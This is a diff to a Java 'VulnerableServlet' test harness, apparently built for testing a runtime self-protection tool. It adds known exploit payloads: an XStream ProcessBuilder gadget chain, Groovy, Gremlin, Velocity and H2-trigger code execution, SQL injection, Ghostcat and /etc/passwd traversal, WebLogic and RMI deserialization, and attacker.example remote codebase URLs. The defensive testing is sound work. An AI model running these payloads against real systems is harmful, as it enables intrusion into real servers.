+  private static boolean dataEaseUserInfoRequest(HttpServletRequest request) {
+    if (!"GET".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/de2api/user/info");
+  }
+
+  private static String dataEaseUserInfo(HttpServletRequest request) throws Exception {
+    String token = valueOrDefault(request.getHeader("X-DE-TOKEN"), "");
+    if (!token.isBlank()) {
+      hook(
+          "beforeSyntheticJwtVerificationFailure",
+          new Class<?>[] {
+            String.class,
+            String.class,
+            String.class,
+            Map.class,
+            Map.class,
+            String.class,
+            String.class,
+            String.class
+          },
+          request.getMethod(),
+          requestPathWithoutContext(request),
+          valueOrDefault(request.getQueryString(), ""),
+          Map.of(),
+          Map.of(
+              "user-agent",
+              valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0"),
+              "x-de-token",
+              token),
+          "auth0-java-jwt",
+          "com.auth0.jwt.exceptions.SignatureVerificationException",
+          "The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256");
+    }
+    return "{\"code\":0,\"data\":{\"uid\":1,\"oid\":1}}";
+  }
+
+  private static boolean ofbizProgramExportRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/webtools/control/main/ProgramExport");
+  }
+
+  private static String ofbizProgramExport(HttpServletRequest request) throws Exception {
+    String script = value(request, "groovyProgram", "throw new Exception('id'.\\u0065xecute().text);");
+    hook(
+        "beforeSyntheticHttpRequest",
+        new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
+        request.getMethod(),
+        requestPathWithoutContext(request),
+        valueOrDefault(request.getQueryString(), ""),
+        Map.of("groovyProgram", List.of(script)),
+        Map.of(
+            "content-type",
+            valueOrDefault(request.getHeader("Content-Type"), "multipart/form-data"),
+            "user-agent",
+            valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
+    return "ofbiz-program-export=" + script.length();
+  }
+
+  private static String requestPathWithoutContext(HttpServletRequest request) {
+    String path = request.getRequestURI();
+    String context = request.getContextPath();
+    if (context != null && !context.isBlank() && path.startsWith(context)) {
+      path = path.substring(context.length());
+    }
+    return path;
   }
 
   private static String invokeJmxRemoteConfig(HttpServletRequest request) throws Exception {
@@ -1002,6 +1745,35 @@ public final class VulnerableServlet extends HttpServlet {
     return "jdbc:h2:mem:ohmyrasp_h2_init;INIT=" + h2PayloadSql().replace(";", "\\;");
   }
 
+  private static String strutsXmlPolymorphicGadgetBody() {
+    return """
+        <map>
+          <entry>
+            <jdk.nashorn.internal.objects.NativeString>
+              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+                <dataHandler>
+                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+                    <is class="javax.crypto.CipherInputStream">
+                      <cipher class="javax.crypto.NullCipher">
+                        <serviceIterator class="javax.imageio.spi.FilterIterator">
+                          <next class="java.lang.ProcessBuilder">
+                            <command>
+                              <string>touch</string>
+                              <string>/tmp/success</string>
+                            </command>
+                          </next>
+                        </serviceIterator>
+                      </cipher>
+                    </is>
+                  </dataSource>
+                </dataHandler>
+              </value>
+            </jdk.nashorn.internal.objects.NativeString>
+          </entry>
+        </map>
+        """;
+  }
+
   private static boolean h2ConsoleJndiDriver(String driver) {
     String normalized =
         driver == null ? "" : driver.trim().replace('/', '.').toLowerCase(java.util.Locale.ROOT);
@@ -1076,6 +1848,10 @@ public final class VulnerableServlet extends HttpServlet {
     return -1;
   }
 
+  private static String coldfusionWddxAccessManager(HttpServletRequest request) {
+    return "coldfusion-wddx=" + value(request, "argumentCollection", "").length();
+  }
+
   private static String requestBody(HttpServletRequest request) throws IOException {
     return new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
   }
@@ -1130,6 +1906,34 @@ public final class VulnerableServlet extends HttpServlet {
     return "jmreport-queryFieldBySql=" + body.length();
   }
 
+  private static boolean dubboHttpInvokerRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/org.vulhub.api.CalcService");
+  }
+
+  private static String dubboHttpInvoker(HttpServletRequest request) throws Exception {
+    hook("beforeHttpInvokerDeserialization", new Class<?>[] {String.class}, "SpringHttpInvoker");
+    return "dubbo-http-invoker=" + Math.max(request.getContentLengthLong(), 0);
+  }
+
+  private static boolean sparkRestSubmissionRequest(HttpServletRequest request) {
+    if (!"POST".equalsIgnoreCase(request.getMethod())) {
+      return false;
+    }
+    return requestPathWithoutContext(request).equals("/v1/submissions/create");
+  }
+
+  private static String sparkRestSubmission(HttpServletRequest request) throws Exception {
+    String body = requestBody(request);
+    if (body.isBlank()) {
+      body = remoteJobDescriptor();
+    }
+    hook("beforeRemoteJobSubmission", new Class<?>[] {String.class, String.class}, "Spark REST", body);
+    return "spark-rest-submission=" + body.length();
+  }
+
   private static String strutsAction(HttpServletRequest request) throws Exception {
     String servletPath = valueOrDefault(request.getServletPath(), "/index.action");
     String contentType = valueOrDefault(request.getHeader("Content-Type"), "");
@@ -1138,13 +1942,39 @@ public final class VulnerableServlet extends HttpServlet {
         || !normalizedContentType.contains("boundary=")) {
       return "struts-action=" + servletPath;
     }
+    List<Part> parts = List.copyOf(request.getParts());
+    for (Part part : parts) {
+      if (strutsFilenameBindingField(part.getName())) {
+        String filename = new String(part.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+        hook(
+            "beforeSyntheticHttpRequest",
+            new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
+            request.getMethod(),
+            requestPathWithoutContext(request),
+            part.getName() + "=[redacted]",
+            Map.of(part.getName(), List.of(filename)),
+            Map.of(
+                "content-type",
+                contentType,
+                "user-agent",
+                valueOrDefault(request.getHeader("User-Agent"), "Mozilla/5.0")));
+      }
+    }
     int submittedFiles = 0;
-    for (Part part : request.getParts()) {
+    for (Part part : parts) {
       if (part.getSubmittedFileName() != null) {
         submittedFiles++;
       }
     }
     return "struts-action=" + servletPath + " uploaded=" + submittedFiles;
+  }
+
+  private static boolean strutsFilenameBindingField(String name) {
+    if (name == null || name.isBlank()) {
+      return false;
+    }
+    String normalized = name.toLowerCase(Locale.ROOT).replace("_", "").replace("-", "");
+    return normalized.equals("filename") || normalized.endsWith("filename");
   }
 
   private static String casLogin(HttpServletRequest request) throws Exception {
@@ -1854,20 +2684,6 @@ public final class VulnerableServlet extends HttpServlet {
             body);
       }
       case "request-hugegraph-gremlin-script" -> {
-        String script =
-            "Thread thread = Thread.currentThread();"
-                + "Class clz = Class.forName(\"java.lang.Thread\");"
-                + "java.lang.reflect.Field field = clz.getDeclaredField(\"name\");"
-                + "field.setAccessible(true);"
-                + "field.set(thread, \"SL7\");"
-                + "Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");"
-                + "java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");"
-                + "startMethod.invoke(processBuilderClass.getConstructor(java.util.List.class)"
-                + ".newInstance(java.util.Arrays.asList(\"id\")));";
-        String body =
-            "{\"gremlin\":\""
-                + jsonString(script)
-                + "\",\"bindings\":{},\"language\":\"gremlin-groovy\",\"aliases\":{}}";
         hook(
             "beforeSyntheticHttpRequestWithBody",
             new Class<?>[] {
@@ -1878,7 +2694,7 @@ public final class VulnerableServlet extends HttpServlet {
             "",
             Map.of(),
             Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
-            body);
+            hugeGraphGremlinBody());
       }
       case "request-ofbiz-groovy-programexport" -> {
         String script = "throw new Exception('id'.\\u0065xecute().text);";
@@ -1922,13 +2738,6 @@ public final class VulnerableServlet extends HttpServlet {
             Map.of("user-agent", "Mozilla/5.0"));
       }
       case "request-dynamic-script-json-config" -> {
-        String script =
-            "function verification(data){a = new java.lang.ProcessBuilder(\"id\")"
-                + ".start().getInputStream();return a;}";
-        String body =
-            "{\"ParamName\":\"\",\"sampleItem\":\"1\",\"validationRules\":\""
-                + script.replace("\\", "\\\\").replace("\"", "\\\"")
-                + "\"}";
         hook(
             "beforeSyntheticHttpRequestWithBody",
             new Class<?>[] {
@@ -1939,7 +2748,7 @@ public final class VulnerableServlet extends HttpServlet {
             "",
             Map.of(),
             Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
-            body);
+            ajReportValidationRulesBody());
       }
       case "request-unomi-context-expression" -> {
         String script = "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");";
@@ -1961,15 +2770,7 @@ public final class VulnerableServlet extends HttpServlet {
             body);
       }
       case "request-metabase-h2-init-config" -> {
-        String init =
-            "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
-                + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
-        String escapedInit =
-            init.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
-        String body =
-            "{\"token\":\"setup-token\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;\",\"init\":\""
-                + escapedInit
-                + "\"},\"engine\":\"h2\"}}";
+        String body = metabaseSetupValidateBody();
         hook(
             "beforeSyntheticHttpRequestWithBody",
             new Class<?>[] {
@@ -2709,16 +3510,13 @@ public final class VulnerableServlet extends HttpServlet {
             body);
       }
       case "request-jira-contact-template" -> {
-        String template =
-            "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null)"
-                + ".invoke(null, null).exec('whoami').toString()";
         hook(
             "beforeSyntheticHttpRequest",
             new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
             "POST",
             "/secure/ContactAdministrators!default.jspa",
-            "subject=help&details=" + template,
-            Map.of("subject", List.of("help"), "details", List.of(template)),
+            "subject=" + jiraContactVelocityTemplate() + "&details=v",
+            Map.of("subject", List.of(jiraContactVelocityTemplate()), "details", List.of("v")),
             Map.of(
                 "content-type",
                 "application/x-www-form-urlencoded",
@@ -2925,11 +3723,6 @@ public final class VulnerableServlet extends HttpServlet {
             body);
       }
       case "request-skywalking-graphql-sql-identifier" -> {
-        String body =
-            "{\"query\":\"query queryLogs($condition: LogQueryCondition) {"
-                + " queryLogs(condition: $condition) { total } }\","
-                + "\"variables\":{\"condition\":{\"metricName\":\"sqli where 1=1 --\","
-                + "\"state\":\"ALL\",\"paging\":{\"pageSize\":10}}}}";
         hook(
             "beforeSyntheticHttpRequestWithBody",
             new Class<?>[] {
@@ -2940,7 +3733,7 @@ public final class VulnerableServlet extends HttpServlet {
             "",
             Map.of(),
             Map.of("user-agent", "Mozilla/5.0", "content-type", "application/json"),
-            body);
+            skyWalkingGraphqlSqlIdentifierBody());
       }
       case "request-internal-forward" ->
           hook(
@@ -2966,6 +3759,15 @@ public final class VulnerableServlet extends HttpServlet {
               new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
               "GET",
               "/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64",
+              "",
+              Map.of(),
+              Map.of("user-agent", "Mozilla/5.0"));
+      case "request-spring-cve-2025-41242-ghostbits-path-traversal" ->
+          hook(
+              "beforeSyntheticHttpRequest",
+              new Class<?>[] {String.class, String.class, String.class, Map.class, Map.class},
+              "GET",
+              "/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64",
               "",
               Map.of(),
               Map.of("user-agent", "Mozilla/5.0"));
@@ -3088,6 +3890,25 @@ public final class VulnerableServlet extends HttpServlet {
                   "javax.servlet.include.request_uri",
                   value(request, "path", "/WEB-INF/web.xml")),
               List.of("org.apache.coyote.ajp.AjpProcessor"));
+      case "request-tomcat-cve-2020-1938-ajp-include" ->
+          hook(
+              "beforeSyntheticServletIncludeAttributes",
+              new Class<?>[] {
+                String.class, String.class, String.class, Map.class, Map.class, Map.class, List.class
+              },
+              "GET",
+              "/asdf",
+              "",
+              Map.of(),
+              Map.of("user-agent", "Mozilla"),
+              Map.of(
+                  "javax.servlet.include.request_uri",
+                  "/",
+                  "javax.servlet.include.path_info",
+                  value(request, "file", "WEB-INF/web.xml"),
+                  "javax.servlet.include.servlet_path",
+                  "/"),
+              List.of("org.apache.coyote.ajp.AjpProcessor"));
       case "directory-reflect" ->
           hook("beforeDirectoryList", new Class<?>[] {Object.class}, "/tmp");
       case "xxe-protocol" ->
@@ -3199,6 +4020,25 @@ public final class VulnerableServlet extends HttpServlet {
                   "weblogic.rjvm.MsgAbbrevInputStream",
                   "weblogic.protocol.ServerChannelInputStream",
                   "weblogic.socket.SocketMuxer"));
+      case "deserialization-weblogic-cve-2018-2628-t3-jrmpclient" ->
+          hook(
+              "beforeSyntheticDeserializationClass",
+              new Class<?>[] {String.class, List.class},
+              "sun.rmi.server.UnicastRef",
+              List.of(
+                  "weblogic.rjvm.InboundMsgAbbrev",
+                  "weblogic.rjvm.MsgAbbrevInputStream",
+                  "weblogic.protocol.ServerChannelInputStream",
+                  "weblogic.socket.SocketMuxer"));
+      case "deserialization-weblogic-cve-2023-21839-iiop-jndi" ->
+          hook(
+              "beforeSyntheticDeserializationClass",
+              new Class<?>[] {String.class, List.class},
+              "com.sun.rowset.JdbcRowSetImpl",
+              List.of(
+                  "weblogic.iiop.IIOPInputStream",
+                  "weblogic.iiop.ServerIIOPConnection",
+                  "weblogic.rmi.internal.BasicServerRef"));
       case "deserialization-jms-object-message" ->
           hook(
               "beforeSyntheticDeserializationClass",
@@ -3262,6 +4102,14 @@ public final class VulnerableServlet extends HttpServlet {
               "bind",
               "pwn",
               remoteProxy(),
+              rmiRegistryStack());
+      case "deserialization-rmi-registry-bind-bypass" ->
+          hook(
+              "beforeSyntheticRmiRegistryBind",
+              new Class<?>[] {String.class, String.class, String.class, List.class},
+              "rebind",
+              "pwn",
+              "sun.rmi.server.UnicastRef",
               rmiRegistryStack());
       case "ognl" ->
           hook(
@@ -3665,6 +4513,7 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"request","name":"Druid sampler JavaScript","path":"/rasp/policy/request-druid-javascript-sampler"},
           {"category":"request","name":"Druid Kafka JAAS sampler","path":"/druid/indexer/v1/sampler?for=connect"},
           {"category":"request","name":"Gremlin Groovy script submission","path":"/rasp/policy/request-hugegraph-gremlin-script"},
+          {"category":"request","name":"HugeGraph Gremlin API script submission","path":"/gremlin"},
           {"category":"request","name":"OFBiz Groovy ProgramExport","path":"/rasp/policy/request-ofbiz-groovy-programexport"},
           {"category":"request","name":"OFBiz remote decorator source","path":"/rasp/policy/request-ofbiz-remote-decorator-source"},
           {"category":"request","name":"Groovy script validation payload","path":"/rasp/policy/request-jenkins-groovy-checkscript"},
@@ -3735,10 +4584,12 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"request","name":"Elasticsearch snapshot path traversal","path":"/rasp/policy/request-path-confusion?uri=/_snapshot/test/backdata%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"},
           {"category":"request","name":"Decoded internal web resource","path":"/rasp/policy/request-internal-resource"},
           {"category":"request","name":"Forged servlet include attribute","path":"/rasp/policy/request-forged-include-attribute"},
+          {"category":"request","name":"Tomcat Ghostcat AJP include attributes","path":"/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"},
           {"category":"request","name":"Control-character path confusion","path":"/rasp/policy/request-path-confusion?uri=/admin/%250atest"},
           {"category":"request","name":"Jetty lenient hex path confusion","path":"/rasp/policy/request-path-confusion?uri=/setup/setup-s/%252%3E%252%3E/%252%3E%252%3E/user-create.jsp"},
           {"category":"request","name":"Overlong UTF-8 path confusion","path":"/rasp/policy/request-path-confusion?uri=/theme/META-INF/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd"},
           {"category":"request","name":"Spring Jetty ghost-bits path confusion","path":"/rasp/policy/request-spring-jetty-ghostbits-path-confusion"},
+          {"category":"request","name":"Spring CVE-2025-41242 ghost-bits traversal","path":"/rasp/policy/request-spring-cve-2025-41242-ghostbits-path-traversal"},
 
           {"category":"command","name":"Command user input","path":"/rasp/command?cmd=sh&arg=-c&arg=cat%20/etc/passwd%3B%20id"},
           {"category":"command","name":"Command common payload","path":"/rasp/command/common"},
@@ -3774,6 +4625,7 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"network","name":"SSRF protocol policy","path":"/rasp/policy/ssrf-protocol"},
           {"category":"network","name":"SSRF obfuscated localhost policy","path":"/rasp/policy/ssrf-obfuscate"},
           {"category":"java","name":"Remote classloader codebase","path":"/rasp/classloader/url?codebase=http%3A%2F%2Fattacker.example%2Fevil.jar"},
+          {"category":"java","name":"RMIClassLoader remote codebase","path":"/rasp/classloader/rmi-codebase?codebase=http%3A%2F%2Fattacker.example%2FExploit"},
           {"category":"java","name":"Remote Spring XML config","path":"/rasp/spring/config?config=http%3A%2F%2F127.0.0.1%3A9%2Fpoc.xml"},
           {"category":"java","name":"JMX remote config invocation","path":"/rasp/jmx/invoke"},
           {"category":"java","name":"ActiveMQ Jolokia brokerConfig invocation","path":"/api/jolokia/"},
@@ -3803,6 +4655,8 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"java","name":"RMI transport deserialization","path":"/rasp/policy/deserialization-rmi-transport"},
           {"category":"java","name":"Neo4j Shell setSessionVariable deserialization","path":"/neo4j-shell/setSessionVariable?gadget=org.mozilla.javascript.NativeJavaObject"},
           {"category":"java","name":"Remoting transport deserialization","path":"/rasp/policy/deserialization-remoting-transport"},
+          {"category":"java","name":"WebLogic T3 JRMPClient deserialization","path":"/rasp/policy/deserialization-weblogic-cve-2018-2628-t3-jrmpclient"},
+          {"category":"java","name":"WebLogic IIOP JNDI deserialization","path":"/rasp/policy/deserialization-weblogic-cve-2023-21839-iiop-jndi"},
           {"category":"java","name":"JMS ObjectMessage deserialization","path":"/rasp/policy/deserialization-jms-object-message"},
           {"category":"java","name":"SignedObject CLI deserialization","path":"/rasp/policy/deserialization-signed-object"},
           {"category":"java","name":"File-backed session deserialization","path":"/rasp/policy/deserialization-session-file?id=.deserialize"},
@@ -3815,6 +4669,7 @@ public final class VulnerableServlet extends HttpServlet {
           {"category":"java","name":"Hessian dangerous type resolution","path":"/rasp/policy/deserialization-hessian-type"},
           {"category":"java","name":"XML-RPC serialized value","path":"/rasp/policy/deserialization-xmlrpc-serialized"},
           {"category":"java","name":"RMI Registry remote bind","path":"/rasp/policy/deserialization-rmi-registry-bind"},
+          {"category":"java","name":"RMI Registry UnicastRef bind bypass","path":"/rasp/policy/deserialization-rmi-registry-bind-bypass"},
           {"category":"java","name":"ColdFusion AMF deserialization","path":"/flex2gateway/amf"},
           {"category":"java","name":"Polymorphic deserialization type","path":"/rasp/deserialize/polymorphic?parser=fastjson&type=com.sun.rowset.JdbcRowSetImpl"},
           {"category":"java","name":"Fastjson autoType JdbcRowSetImpl","path":"/fastjson"},
@@ -4074,6 +4929,58 @@ public final class VulnerableServlet extends HttpServlet {
         }
         """
         .formatted(jsonString(linkisDatasourceParams()));
+  }
+
+  private static String metabaseSetupValidateBody() {
+    String init =
+        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
+            + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
+    String escapedInit = jsonString(init).replace("\n", "\\n");
+    return "{\"token\":\"setup-token\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;\",\"init\":\""
+        + escapedInit
+        + "\"},\"engine\":\"h2\"}}";
+  }
+
+  private static String ajReportValidationRulesBody() {
+    String script =
+        "function verification(data){a = new java.lang.ProcessBuilder(\"id\")"
+            + ".start().getInputStream();return a;}";
+    return "{\"ParamName\":\"\",\"sampleItem\":\"1\",\"validationRules\":\""
+        + jsonString(script)
+        + "\"}";
+  }
+
+  private static String skyWalkingGraphqlSqlIdentifierBody() {
+    return "{\"query\":\"query queryLogs($condition: LogQueryCondition) {"
+        + " queryLogs(condition: $condition) { total logs { serviceId serviceName isError content } }"
+        + " }\","
+        + "\"variables\":{\"condition\":{\"metricName\":\"sqli where 1=1 --\","
+        + "\"state\":\"ALL\",\"paging\":{\"pageSize\":10}}}}";
+  }
+
+  private static String hugeGraphGremlinBody() {
+    return "{\"gremlin\":\""
+        + jsonString(hugeGraphGremlinScript())
+        + "\",\"bindings\":{},\"language\":\"gremlin-groovy\",\"aliases\":{}}";
+  }
+
+  private static String hugeGraphGremlinScript() {
+    return "Thread thread = Thread.currentThread();"
+        + "Class clz = Class.forName(\"java.lang.Thread\");"
+        + "java.lang.reflect.Field field = clz.getDeclaredField(\"name\");"
+        + "field.setAccessible(true);"
+        + "field.set(thread, \"SL7\");"
+        + "Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");"
+        + "java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);"
+        + "java.util.List command = java.util.Arrays.asList(\"id\");"
+        + "Object processBuilderInstance = constructor.newInstance(command);"
+        + "java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");"
+        + "org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());";
+  }
+
+  private static String jiraContactVelocityTemplate() {
+    return "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null)"
+        + ".invoke(null, null).exec('whoami').toString()";
   }
 
   private static Remote remoteProxy() {
